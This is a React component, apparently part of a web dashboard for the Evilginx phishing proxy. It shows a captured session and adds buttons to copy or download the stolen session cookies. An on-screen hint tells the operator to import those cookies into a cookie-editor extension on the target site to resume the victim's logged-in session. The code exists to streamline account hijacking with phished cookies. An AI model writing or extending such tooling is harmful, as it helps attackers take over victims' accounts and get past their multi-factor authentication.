import React, { useState } from 'react';

async function copyText(text) {
  try {
    await navigator.clipboard.writeText(text);
  } catch {
    const el = document.createElement('textarea');
    el.value = text;
    el.style.position = 'fixed';
    el.style.opacity = '0';
    document.body.appendChild(el);
    el.select();
    document.execCommand('copy');
    document.body.removeChild(el);
  }
}

function downloadJson(filename, obj) {
  const blob = new Blob([JSON.stringify(obj, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = filename;
  a.click();
  URL.revokeObjectURL(url);
}

// Evilginx's own `sessions <id>` console output already generates a
// browser-extension-ready JSON cookie export and recommends importing it via
// a cookie-editor extension to resume the captured session — this just
// surfaces that with copy/download buttons instead of making you dig it out
// of the raw text.
export default function SessionDetail({ id, raw, cookies }) {
  const [copied, setCopied] = useState(false);

  async function copy() {
    await copyText(JSON.stringify(cookies));
    setCopied(true);
    setTimeout(() => setCopied(false), 1200);
  }

  return (
    <div className="card stack">
      <pre style={{ whiteSpace: 'pre-wrap', fontSize: 12, margin: 0 }}>{raw}</pre>
      {cookies && cookies.length > 0 && (
        <div className="stack" style={{ borderTop: '1px solid var(--border)', paddingTop: 10 }}>
          <div className="row" style={{ justifyContent: 'space-between' }}>
            <span className="dim">{cookies.length} cookie{cookies.length === 1 ? '' : 's'} captured</span>
            <div className="row">
              <button onClick={copy}>{copied ? 'Copied' : 'Copy cookies JSON'}</button>
              <button onClick={() => downloadJson(`session-${id}-cookies.json`, cookies)}>Download .json</button>
            </div>
          </div>
          <p className="dim" style={{ margin: 0, fontSize: 12 }}>
            Import into a cookie-editor browser extension (e.g.{' '}
            <a href="https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo" target="_blank" rel="noreferrer">
              StorageAce
            </a>, as evilginx itself suggests) on the target site's domain to resume this session.
          </p>
        </div>
      )}
    </div>
  );
}
